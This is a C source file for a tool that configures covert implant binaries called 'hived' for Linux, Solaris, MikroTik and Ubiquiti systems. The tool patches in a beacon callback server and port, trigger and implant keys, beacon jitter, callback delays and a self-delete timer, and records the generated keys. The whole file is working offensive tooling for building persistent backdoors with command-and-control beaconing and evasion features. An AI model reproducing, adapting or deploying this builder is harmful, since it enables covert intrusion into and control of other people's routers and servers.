#include <stdio.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include "trigger_protocols.h"

#include "_unpatched_solaris_sparc.h"
#include "_unpatched_solaris_x86.h"
#include "_unpatched_linux_x86.h"
#include "_unpatched_mikrotik_x86.h"
#include "_unpatched_mikrotik_mips.h"
#include "_unpatched_mikrotik_mipsel.h"
#include "_unpatched_mikrotik_ppc.h"
#include "_unpatched_ubiquiti_mips.h"

#include "debug.h"
#include "string_utils.h"
#include "colors.h"

//PolarSSL Files
#include "polarssl/config.h"
#include "polarssl/sha1.h"

#define HIVE_SOLARIS_SPARC_FILE "hived-solaris-sparc-PATCHED"
#define HIVE_SOLARIS_X86_FILE "hived-solaris-x86-PATCHED"
#define HIVE_LINUX_X86_FILE "hived-linux-x86-PATCHED"
#define HIVE_MIKROTIK_X86_FILE "hived-mikrotik-x86-PATCHED"
#define HIVE_MIKROTIK_MIPS_FILE "hived-mikrotik-mips-PATCHED"
#define HIVE_MIKROTIK_MIPSEL_FILE "hived-mikrotik-mipsel-PATCHED"
#define HIVE_MIKROTIK_PPC_FILE "hived-mikrotik-ppc-PATCHED"
#define HIVE_UBIQUITI_MIPS_FILE "hived-ubiquiti-mips-PATCHED"

#define HIVE_SOLARIS_SPARC_UNPATCHED "hived-solaris-sparc-UNpatched"
#define HIVE_SOLARIS_X86_UNPATCHED "hived-solaris-x86-UNpatched"
#define HIVE_LINUX_X86_UNPATCHED "hived-linux-x86-UNpatched"
#define HIVE_MIKROTIK_X86_UNPATCHED "hived-mikrotik-x86-UNpatched"
#define HIVE_MIKROTIK_MIPS_UNPATCHED "hived-mikrotik-mips-UNpatched"
#define HIVE_MIKROTIK_MIPSEL_UNPATCHED "hived-mikrotik-mipsel-UNpatched"
#define HIVE_MIKROTIK_PPC_UNPATCHED "hived-mikrotik-ppc-UNpatched"
#define HIVE_UBIQUITI_MIPS_UNPATCHED "hived-ubiquiti-mips-UNpatched"

#define ID_KEY_FILE	"ID-keys.txt"
#define ID_KEY_DATETIME_FORMAT	"%4i/%02i/%02i %02i:%02i:%02i"

#define CREAT_MODE	S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH

#define OPTMATCH(o, s) ( strlen((o))==strlen((s)) && (strcmp((o),(s))== 0) )

//********************************************************************************
//rsa_context           rsa;
struct cl_args {
	unsigned int sig;
	unsigned int beacon_port;
	unsigned int host_len;
	char beacon_ip[256];
	char iface[16];
	unsigned char idKey[ID_KEY_HASH_SIZE];
	unsigned long init_delay;
	unsigned int interval;
	unsigned int trigger_delay;
	unsigned int jitter;
	time_t delete_delay;
	unsigned int patched;
} __attribute__ ((packed));

#define SIG_HEAD    0x7AD8CFB6

struct cl_args args = { SIG_HEAD, 0, 0, {0}, {0}, {0}, 0, 0, 0, 0, 0, 0 };

#define DEFAULT_INITIAL_DELAY		3 * 60 * 1000	// 3 minutes
#define DEFAULT_BEACON_PORT		443	// TCP port 443 (HTTPS)
#define DEFAULT_BEACON_INTERVAL		0	// operators did not want a default value
#define DEFAULT_TRIGGER_DELAY		60 * 1000	// 60 seconds
#define DEFAULT_BEACON_JITTER		3	// Default value is 3, range is from 0<=jitter<=30
#define DEFAULT_SELF_DELETE_DELAY	60 * 24 * 60 * 60	// Default value is 60 days...

//define displaySha1Hash function
void printSha1Hash(FILE *file, char *label, unsigned char *sha1Hash)
{
	int i = 0;

	//Display Label
	fprintf(file, "%s", label);

	//Display 40 hexadecimal number array
	for (i = 0; i < ID_KEY_HASH_SIZE; i++)
		fprintf(file, "%02x", sha1Hash[i]);
}

//********************************************************************************
int user_instructions(void);
//int local_gen_keys( char *pubkeyfile, char *privkeyfile, int keySz );
int patch(char *filename, unsigned char *hexarray, unsigned int arraylen, struct cl_args patched_args);
int non_patch(char *filename, unsigned char *hexarray, unsigned int arraylen);

//********************************************************************************
int usage(char **argv)
{
	printf("\n");
	fprintf(stdout, "  %sUsage:%s\n", BLUE, RESET);
	fprintf(stdout, "  %s -a address [-d b_delay] [-i interval] (-k idKey | -K idKeyFile) [-I interface] [-p port] [-t t_delay] [-m OS] \n\n", *argv);
	fprintf(stdout, "    %s-a <address>%s       - IP address or hostname of beacon server\n", GREEN, RESET);
	fprintf(stdout, "    %s-d <b_delay>%s       - initial delay before first beacon (in seconds), 0 for no beacons.\n", GREEN, RESET);
	fprintf(stdout, "    %s-i <interval>%s      - beacon interval (in seconds)\n", GREEN, RESET);
	fprintf(stdout, "    %s-K <idKeyFile>%s     - ID key filename (maximum 100 character path)\n", GREEN, RESET);
	fprintf(stdout, "    %s-k <ID Key Phrase>%s - ID key phrase (maximum 100 character string)\n", GREEN, RESET);
	fprintf(stdout, "    %s-j <b_jitter>%s      - beacon jitter (integer of percent variance between 0 and 30 [0-30] )\n", GREEN, RESET);
	fprintf(stdout, "    %s-I <interface>%s     - Solaris Only - interface to listen for triggers\n", GREEN, RESET);
	fprintf(stdout, "    %s-p <port>%s          - (optional) beacon port [default: 443]\n", GREEN, RESET);
	fprintf(stdout, "    %s-s <sd_delay>%s      - (optional) self delete delay since last successful trigger/beacon (in seconds) [default: 60 days]\n", GREEN, RESET);
	fprintf(stdout, "    %s-t <t_delay>%s       - (optional) delay between trigger received & callback +/- 30 sec (in seconds) [default: 60 sec]\n", GREEN, RESET);
	fprintf(stdout, "    %s-m <OS>%s            - (optional) target OS [default: 'all'].  options:\n", GREEN, RESET);
	fprintf(stdout, "                             * 'all' - default\n");
	fprintf(stdout, "                             * 'raw' - all unpatched\n");
	fprintf(stdout, "                             * 'mt-x86'\n");
	fprintf(stdout, "                             * 'mt-mips' (or 'mt-mipsbe' (deprecated) )\n");
	fprintf(stdout, "                             * 'mt-mipsel' (or 'mt-mipsle' (deprecated) )\n");
	fprintf(stdout, "                             * 'mt-ppc'\n");
	fprintf(stdout, "                             * 'linux-x86'\n");
	fprintf(stdout, "                             * 'sol-x86'\n");
	fprintf(stdout, "                             * 'sol-sparc'\n");
	fprintf(stdout, "                             * 'ub-mips'\n");
	fprintf(stdout, "    %s[-h ]%s              - print this usage\n\n", GREEN, RESET);
//   fprintf(stdout, "  %sExamples:%s\n", BLUE, RESET);
//   fprintf( stdout, "   Coming soon!\n\n" );
	printf("\n");
	return 0;
}

//********************************************************************************
int RandFill(char *buf, int size)
{
	int i;
	static int srand_set;

	if (srand_set != 1) {
		srand(time(NULL));
		srand_set = 1;
	}

	for (i = 0; i < size; i++) {
		buf[i] = (char) (rand() % 255);
	}

	return 0;
}

//********************************************************************************
int main(int argc, char **argv)
{
	int optval;
	int linux_x86 = 0;							// Linux x86
	int solaris_sparc = 0;						// Solaris SPARC
	int solaris_x86 = 0;						// Solaris x86
	int mikrotik_x86 = 0;						// MikroTik x86
	int mikrotik_mips = 0;						// MikroTik MIPS Big Endian
	int mikrotik_mipsel = 0;					// MikroTik MIPS Little Endian
	int mikrotik_ppc = 0;						// MikroTik PowerPC [Big Endian]
	int ubiquiti_mips = 0;						// Ubiquiti MIPS Big Endian
	int raw = 0;								// unpatched versions
	char *host = (char *) NULL;					// cached hostname for user confirmation message
	FILE *implantIDFile;						// Used to save implant keys and subsequent sha1 hashes...
	time_t currentTime;							// Time stamp for ID key generation
	struct tm *idKeyTime;						// Pointer to the ID key generation data structure
	unsigned char implantKey[ID_KEY_HASH_SIZE];
	unsigned char triggerKey[ID_KEY_HASH_SIZE];
	enum {FALSE=0, TRUE} keyed = FALSE;			// Boolean to verify that a key was entered

	implantKey[0] = '\0';

	args.patched = 1;
	args.init_delay = DEFAULT_INITIAL_DELAY;
	args.beacon_port = DEFAULT_BEACON_PORT;
	args.interval = DEFAULT_BEACON_INTERVAL;
	args.trigger_delay = DEFAULT_TRIGGER_DELAY;
	args.delete_delay = DEFAULT_SELF_DELETE_DELAY;
	args.jitter = DEFAULT_BEACON_JITTER;
	args.host_len = 0;

	while ((optval = getopt(argc, argv, "+a:d:hI:i:j:K:k:m:p:s:t:")) != -1) {
		switch (optval) {

		case 'a':	// Hostname / IP address of beacon LP
			if (strlen(optarg) > sizeof(args.beacon_ip)) {
				printf(" ERROR: Hostname or IP exceeds %d character limit\n", (int)sizeof(args.beacon_ip));
				return -1;
			}
/*
			if ( inet_aton( optarg, &addr_check ) == 0 )
			{
			    printf( " ERROR: invalid IP address specified\n" );
			    return -1;
			}
*/
			// save pointer to the unmodified user input.  this is echo'd back to user
			host = optarg;

			// fill/initialize structure with random data
			RandFill(args.beacon_ip, sizeof(args.beacon_ip));

			args.host_len = strlen(optarg);
			memcpy(args.beacon_ip, optarg, strlen(optarg));

			// copy string representation of hostname or IP into the structure
			memcpy(args.beacon_ip, optarg, args.host_len);

			break;

		case 'd':	// initial delay
			args.init_delay = strtoul(optarg, NULL, 10) * 1000;
			break;

		case 'h':	// Help
			usage(argv);
			break;

		case 'I':	// interface to listen for triggers. only needed for solaris
			if (strlen(optarg) > sizeof(args.iface)) {
				printf(" ERROR: Name of interface is too long\n");
				return -1;
			}
			// copy string representation of interface name into patched structure
			memcpy(args.iface, optarg, strlen(optarg));

			break;

		case 'i':	// beacon interval
			args.interval = (unsigned int) atoi(optarg) * 1000;
			break;

		case 'j':	// beacon jitter
			args.jitter = (unsigned int) atoi(optarg);
			break;

			// The implant key is generated from the SHA-1 hash of the SHA-1 hash of the text entered
			// on the command line (-k option), or by reading the contents of the key file (using the -K option).
		case 'K':
			{	struct stat	statbuf;

				if (implantKey[0] != '\0') {	// Ensure that both -k and -K options aren't used together.
					fprintf(stderr, "ERROR: Only one key option (-k or -K) can be used.\n");
					return -1;
				}

				if (access(optarg, R_OK)) {
					fprintf( stderr, "Key file \"%s\" not found or not readable.\n", optarg);
					return -1;
				}
				if (stat(optarg, &statbuf) != 0) {
					perror("Cannot obtain key file attributes.");
					return -1;
				}

				implantIDFile = fopen(ID_KEY_FILE, "a+");	// Open file to save implant keys and associated SHA1 hashes
				if (implantIDFile == NULL) {
					printf("Unable to save implantID information into the idKeys.txt file.\n");
					return -1;
				}

				currentTime = time(NULL);
				idKeyTime = gmtime(&currentTime);

				if (statbuf.st_size >= ID_KEY_LENGTH_MIN) { 	// Validate that the key text in the file is of sufficient length
					fprintf(implantIDFile, ID_KEY_DATETIME_FORMAT "\tFILE: %s",	// Record the ID key time and text
					idKeyTime->tm_year + 1900, idKeyTime->tm_mon + 1, idKeyTime->tm_mday,
					idKeyTime->tm_hour, idKeyTime->tm_min, idKeyTime->tm_sec,  optarg);
					sha1_file((const char *)optarg, triggerKey);		// Generate the trigger key from the key file
					D(printSha1Hash (stdout, "Trigger Key", triggerKey));

					sha1(triggerKey, ID_KEY_HASH_SIZE, implantKey);		// Generate the implant key
					printSha1Hash(implantIDFile, "\t", triggerKey);
					printSha1Hash(implantIDFile, "\t", implantKey);		// Record the implant key

					fprintf(implantIDFile, "\n");				// Close the record file
					fclose(implantIDFile);
					D(printSha1Hash (stdout, "Implant Key", implantKey));
					D(printf("\n\n\n" ));
				} else {
					fprintf(stderr, "ERROR: ID key length must be at least %i characters\n", ID_KEY_LENGTH_MIN);
					return -1;
				}
				memcpy(args.idKey, implantKey, sizeof(args.idKey));		// Copy the implant key to the patched args
				keyed = TRUE;
				break;
			}

		case 'k':

			if (implantKey[0] != '\0') {	// Ensure that both -k and -K options aren't used together.
				fprintf(stderr, "ERROR: Only one key option (-k or -K) can be used.\n");
				return -1;
			}

			if (strlen(optarg) < ID_KEY_LENGTH_MIN) {
				fprintf(stderr, "ERROR: ID key length must be at least %i characters\n", ID_KEY_LENGTH_MIN);
				return -1;
			}

			implantIDFile = fopen(ID_KEY_FILE, "a+");	// Open file to save implant keys and associated SHA1 hashes
			if (implantIDFile == NULL) {
				printf("Unable to save implantID information into the idKeys.txt file.\n");
				return -1;
			}

			currentTime = time(NULL);
			idKeyTime = gmtime(&currentTime);
			fprintf(implantIDFile, ID_KEY_DATETIME_FORMAT "\t%s",			// Record the ID key time and text
				idKeyTime->tm_year + 1900, idKeyTime->tm_mon + 1, idKeyTime->tm_mday,
				idKeyTime->tm_hour, idKeyTime->tm_min, idKeyTime->tm_sec,  optarg);
			D(printf("\n\n\n DEBUG: keyPhrase=%s \n", optarg));

			sha1((const unsigned char *) optarg, strlen(optarg), triggerKey);	// Compute trigger key
			D(printSha1Hash(stdout, "Trigger Key", triggerKey));
			printSha1Hash(implantIDFile, "\t", triggerKey);				// Record the trigger key

			sha1(triggerKey, ID_KEY_HASH_SIZE, implantKey);				// Compute implant key
			D(printSha1Hash(stdout, "Implant Key", implantKey));
			D(printf("\n\n\n"));
			printSha1Hash(implantIDFile, "\t", implantKey);				// Record the implant key

			fprintf(implantIDFile, "\n");						// Close the record file
			fclose(implantIDFile);
			memcpy(args.idKey, implantKey, sizeof(args.idKey));			// Copy the implant key to the patched args
			keyed = TRUE;
			break;

		case 'm':	// operating system: valid linux, solaris, all, or raw

			do {
				if (OPTMATCH(optarg, "mt-ppc"))		{mikrotik_ppc = 1;		break;}
				if (OPTMATCH(optarg, "mt-mips"))	{mikrotik_mips = 1;		break;}
				if (OPTMATCH(optarg, "mt-mipsbe"))	{mikrotik_mips = 1;		break;}
				if (OPTMATCH(optarg, "mt-x86"))		{mikrotik_x86 = 1;		break;}
				if (OPTMATCH(optarg, "sol-x86"))	{solaris_x86 = 1;		break;}
				if (OPTMATCH(optarg, "sol-sparc"))	{solaris_sparc = 1;		break;}
				if (OPTMATCH(optarg, "linux-x86"))	{linux_x86 = 1;			break;}
				if (OPTMATCH(optarg, "mt-mipsel"))	{mikrotik_mipsel = 1;	break;}
				if (OPTMATCH(optarg, "mt-mipsle"))	{mikrotik_mipsel = 1;	break;}
				if (OPTMATCH(optarg, "ub-mips"))	{ubiquiti_mips = 1;		break;}
				if (OPTMATCH(optarg, "raw"))		{raw = 1;				break;}

				if (OPTMATCH(optarg, "all"))		{solaris_sparc = 1,
													linux_x86 = 1,
													solaris_x86 = 1,
													mikrotik_x86 = 1,
													mikrotik_mips = 1,
													mikrotik_mipsel = 1,
													mikrotik_ppc = 1,
													ubiquiti_mips = 1;		break;}
				printf(" ERROR: Invalid architecture specified\n");
				return -1;
			} while (0);
			break;

		case 'p':	// beacon port
			args.beacon_port = (unsigned int) atoi(optarg);
			if (args.beacon_port < 1 || args.beacon_port > 65535) {
				printf("ERROR: Invalid port number for beacon\n");
				return -1;
			}
			break;

		case 's':	// self delete delay
			args.delete_delay = strtoul(optarg, NULL, 10);
			break;

		case 't':	// trigger delay
			args.trigger_delay = (unsigned int) atoi(optarg) * 1000;
			break;

		default:
			printf(" ERROR: Invalid option or option requires a parameter\n");
			return -1;
			break;
		}
	}

	if (! keyed) {		// Verify that a key was supplied
		printf("\n    %sERROR: Key missing%s\n ", RED, RESET);
		usage(argv);
		return -1;
	}

	if (raw == 0) {
		if ((args.beacon_port == 0) || (args.interval == 0) || (strlen(args.beacon_ip) == 0)) {
			printf("\n");
			printf("    %sERROR: Incomplete options%s\n", RED, RESET);
			usage(argv);
			return -1;
		}
		//Enforce 0<=jitter<=30 jitter requirement.
		if (((int) args.jitter < 0) || (args.jitter > 30)) {
			printf("\n");
			printf("    %sError: Incorrect options%s\n", RED, RESET);
			usage(argv);
			return -1;
		}

		if (	(linux_x86 == 0) && (solaris_sparc == 0) && (solaris_x86 == 0) && (mikrotik_x86 == 0) &&
				(mikrotik_mips == 0) && (mikrotik_ppc == 0) && (mikrotik_mipsel == 0) && (ubiquiti_mips == 0)) {	// no OS was selected, so default is to build all
			solaris_sparc = 1;
			linux_x86 = 1;
			solaris_x86 = 1;
			mikrotik_x86 = 1;
			mikrotik_mips = 1;
			mikrotik_mipsel = 1;
			mikrotik_ppc = 1;
			ubiquiti_mips = 1;
		}

		if ((solaris_sparc == 1) || (solaris_x86 == 1)) {	// Solaris must have the interface patched in
			if (strlen(args.iface) == 0) {
				printf("\n");
				printf("    ERROR: Incomplete options. %sSolaris%s requires an interface be selected.\n", RED,
				       RESET);
				usage(argv);
				return -1;
			}
		}

		printf("\n");
		printf("  This application will generate PATCHED files with the following values:\n");
		printf("   . Beacon Server IP address    -> %s\n", host);
		printf("   . Beacon Server Port number   -> %d\n", args.beacon_port);
		printSha1Hash(stdout, "   . Trigger Key                 -> ", triggerKey);
		printf("\n");
		printSha1Hash(stdout, "   . Implant Key                 -> ", implantKey);
		printf("\n");
		printf("   . Beacon Initial Delay        -> %lu (sec)\n", args.init_delay / 1000);
		printf("   . Beacon Interval             -> %d (sec)\n", args.interval / 1000);
		printf("   . Beacon Jitter               -> %d (percentage)\n", args.jitter);	//Added jitter display
		printf("   . Self Delete Delay           -> %lu (sec)\n", args.delete_delay);
		printf("   . Trigger Delay               -> %d +/- 30 (sec)\n", args.trigger_delay / 1000);
	}

	if (solaris_sparc == 1 || solaris_x86 == 1) {
		printf("   . Listening Interface         -> %s     (Solaris Only)\n", args.iface);
	}

	printf("\n");
	printf("  Target Operating Systems:\n");

	// little endian systems targets

	if (linux_x86 == 1 || raw == 1) {
		printf("   . Linux/x86\n");
	}

	if (solaris_sparc == 1 || raw == 1) {
		printf("   . Solaris/SPARC\n");
	}

	if (solaris_x86 == 1 || raw == 1) {
		printf("   . Solaris/x86\n");
	}

	if (mikrotik_x86 == 1 || raw == 1) {
		printf("   . MikroTik/x86\n");
	}

	if (mikrotik_mipsel == 1 || raw == 1) {
		printf("   . MikroTik/MIPS (little endian)\n");
	}
	// beginning of big endian targets

	if (mikrotik_mips == 1 || raw == 1) {
		printf("   . MikroTik/MIPS\n");
	}

	if (mikrotik_ppc == 1 || raw == 1) {
		printf("   . MikroTik/PPC\n");
	}

	if (ubiquiti_mips == 1 || raw == 1) {
		printf("   . Ubiquiti/MIPS\n");
	}

	if (raw == 0) {
		cl_string((unsigned char *) args.beacon_ip, sizeof(args.beacon_ip));
		cl_string((unsigned char *) args.iface, sizeof(args.iface));
	}

	remove(HIVE_SOLARIS_SPARC_FILE);
	remove(HIVE_SOLARIS_X86_FILE);
	remove(HIVE_LINUX_X86_FILE);
	remove(HIVE_MIKROTIK_X86_FILE);
	remove(HIVE_MIKROTIK_MIPS_FILE);
	remove(HIVE_MIKROTIK_MIPSEL_FILE);
	remove(HIVE_MIKROTIK_PPC_FILE);
	remove(HIVE_UBIQUITI_MIPS_FILE);

	remove(HIVE_SOLARIS_SPARC_UNPATCHED);
	remove(HIVE_SOLARIS_X86_UNPATCHED);
	remove(HIVE_LINUX_X86_UNPATCHED);
	remove(HIVE_MIKROTIK_X86_UNPATCHED);
	remove(HIVE_MIKROTIK_MIPS_UNPATCHED);
	remove(HIVE_MIKROTIK_MIPSEL_UNPATCHED);
	remove(HIVE_MIKROTIK_PPC_UNPATCHED);
	remove(HIVE_UBIQUITI_MIPS_UNPATCHED);


	sleep(1);

//    local_gen_keys( PUBKEYFILE, PRIVKEYFILE, KEY_SIZE );

	if (raw == 1) {
		printf("\n");
		non_patch(HIVE_LINUX_X86_UNPATCHED, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len);
		non_patch(HIVE_SOLARIS_SPARC_UNPATCHED, hived_solaris_sparc_unpatched, hived_solaris_sparc_unpatched_len);
		non_patch(HIVE_SOLARIS_X86_UNPATCHED, hived_solaris_x86_unpatched, hived_solaris_x86_unpatched_len);
		non_patch(HIVE_MIKROTIK_X86_UNPATCHED, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len);
		non_patch(HIVE_MIKROTIK_MIPSEL_UNPATCHED, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len);
		non_patch(HIVE_MIKROTIK_MIPS_UNPATCHED, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len);
		non_patch(HIVE_MIKROTIK_PPC_UNPATCHED, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len);
		non_patch(HIVE_UBIQUITI_MIPS_UNPATCHED, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len);
	}
// We start as Little Endian.  If the binary is detected as Big Endian, then the structure
// is changed to Big Endian.  Since these changes are made in a global variable used by all
// parsers, check for Little Endian variants first and the Big Endian possibilities next.

	if (linux_x86 == 1) {
		patch(HIVE_LINUX_X86_FILE, hived_linux_x86_unpatched, hived_linux_x86_unpatched_len, args);
	}

	if (solaris_x86 == 1) {
		patch(HIVE_SOLARIS_X86_FILE, hived_solaris_x86_unpatched, hived_solaris_x86_unpatched_len, args);
	}

	if (mikrotik_x86 == 1) {
		patch(HIVE_MIKROTIK_X86_FILE, hived_mikrotik_x86_unpatched, hived_mikrotik_x86_unpatched_len, args);
	}

	if (mikrotik_mipsel == 1) {
		patch(HIVE_MIKROTIK_MIPSEL_FILE, hived_mikrotik_mipsel_unpatched, hived_mikrotik_mipsel_unpatched_len, args);
	}

	if (mikrotik_ppc == 1) {
		patch(HIVE_MIKROTIK_PPC_FILE, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len, args);
	}

	if (mikrotik_mips == 1) {
		patch(HIVE_MIKROTIK_MIPS_FILE, hived_mikrotik_mips_unpatched, hived_mikrotik_mips_unpatched_len, args);
	}

	if (ubiquiti_mips == 1) {
		patch(HIVE_UBIQUITI_MIPS_FILE, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len, args);
	}
// beginning of big endian targets
	if (solaris_sparc == 1) {
		patch(HIVE_SOLARIS_SPARC_FILE, hived_solaris_sparc_unpatched, hived_solaris_sparc_unpatched_len, args);
	}

	printf("\n");
	return 0;
}

//********************************************************************************
int non_patch(char *filename, unsigned char *hexarray, unsigned int arraylen)
{
	int fd, ret;

	printf("  Generating %s file...", filename);

	fd = creat(filename, CREAT_MODE);
	if (fd < 0) {
		perror("creat");
		exit(-1);
	}

	ret = write(fd, hexarray, arraylen);

	if ((unsigned int) ret != arraylen) {
		printf("FAILED\n  Writing Server incomplete.  Aborting.\n\n");
		exit(-1);
	}

	close(fd);

	printf(" ok\n");

	return 0;
}

//********************************************************************************
int patch(char *filename, unsigned char *hexarray, unsigned int arraylen, struct cl_args patched_args)
{
	unsigned int sig_head = SIG_HEAD;
	uint32_t sig_head2 = ntohl(SIG_HEAD);
	unsigned char *p;	//, keybuffer[128];
	int fd, ret = 1;
	unsigned int cnt = 0;
	int big_endian = 0;
	struct cl_args copy_of_args = patched_args;


	printf("  \n");

	p = hexarray;
	cnt = 0;
	do {
		if (cnt > arraylen) {
			printf("\n  Patch signature not found in %s.  Aborting.\n\n", filename);
			exit(0);
			break;
		}
		// try #1 LITTLE ENDIAN
		// TODO: once the first big endian target is found and the structure is swapped to 
		// big endian, I think all successive BIG ENDIAN targets are actually matching 
		// against the LITTLE ENDIAN rules.  it works, but could be problematic in the future
		ret = memcmp((unsigned int *) p, &sig_head, sizeof(SIG_HEAD));

		// try #2 BIG ENDIAN
		if (ret != 0) {
			ret = memcmp((unsigned int *) p, &sig_head2, sizeof(SIG_HEAD));
			if (ret == 0)
				big_endian = 1;
		}

		p++;
		cnt++;
	} while (ret != 0);

	p--;
	printf("  SIG_HEAD found at offset %08x for %s\n", (int)(p - hexarray), filename);

//      memcpy( p + sizeof( SIG_HEAD ), keybuffer, 128 );
	if (big_endian == 0) {
		memcpy(p, &copy_of_args, sizeof(struct cl_args));
	} else if (big_endian == 1) {
		copy_of_args.sig = htonl(copy_of_args.sig);
		copy_of_args.beacon_port = htonl(copy_of_args.beacon_port);
		copy_of_args.host_len = htonl(copy_of_args.host_len);

		//How do I convert array of sha1 hash into network byte order for different endian type of machines...
		memcpy(copy_of_args.idKey, copy_of_args.idKey, 20 * sizeof(unsigned char));
		//copy_of_args.idKey = htonl( &copy_of_args.idKey );

		copy_of_args.init_delay = htonl(copy_of_args.init_delay);
		copy_of_args.interval = htonl(copy_of_args.interval);
		copy_of_args.jitter = htonl(copy_of_args.jitter);
		copy_of_args.trigger_delay = htonl(copy_of_args.trigger_delay);
		copy_of_args.delete_delay = htonl(copy_of_args.delete_delay);
		copy_of_args.patched = htonl(copy_of_args.patched);

		memcpy(p, &copy_of_args, sizeof(struct cl_args));
	}

	/* write out the patched file */
	printf("  Generating %s file...", filename);

	fd = creat(filename, CREAT_MODE);
	if (fd < 0) {
		perror("creat");
		exit(-1);
	}

	ret = write(fd, hexarray, arraylen);

	if ((unsigned int) ret != arraylen) {
		printf("FAILED\n  Writing Server incomplete.  Aborting.\n\n");
		exit(-1);
	}

	close(fd);

	printf(" ok\n");

	return 0;
}
